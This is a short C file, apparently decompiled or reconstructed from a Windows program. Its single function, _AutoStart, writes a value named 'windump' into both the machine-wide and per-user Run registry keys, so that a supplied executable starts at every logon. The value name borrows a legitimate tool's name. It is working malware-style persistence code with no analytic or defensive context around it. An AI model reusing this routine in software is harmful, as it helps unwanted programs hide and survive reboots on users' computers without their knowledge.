#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <string.h>

#pragma optimize("", off)
void _AutoStart(BYTE *param_1)
{
    volatile struct _LocalCtx {
        LSTATUS LVar1;
        DWORD DVar2;
        HKEY local_10[3];
    } ctx;

    ctx.LVar1 = RegOpenKeyExA((HKEY)0x80000002, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                              0x20006, ctx.local_10);
    if (ctx.LVar1 == 0) {
        ctx.DVar2 = strlen((char *)param_1);
        RegSetValueExA(ctx.local_10[0], "windump", 0, REG_SZ, param_1, ctx.DVar2);
        RegCloseKey(ctx.local_10[0]);
    }
    ctx.LVar1 = RegOpenKeyExA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                              0x20006, ctx.local_10);
    if (ctx.LVar1 == 0) {
        ctx.DVar2 = strlen((char *)param_1);
        RegSetValueExA(ctx.local_10[0], "windump", 0, REG_SZ, param_1, ctx.DVar2);
        RegCloseKey(ctx.local_10[0]);
    }
}
#pragma optimize("", on)
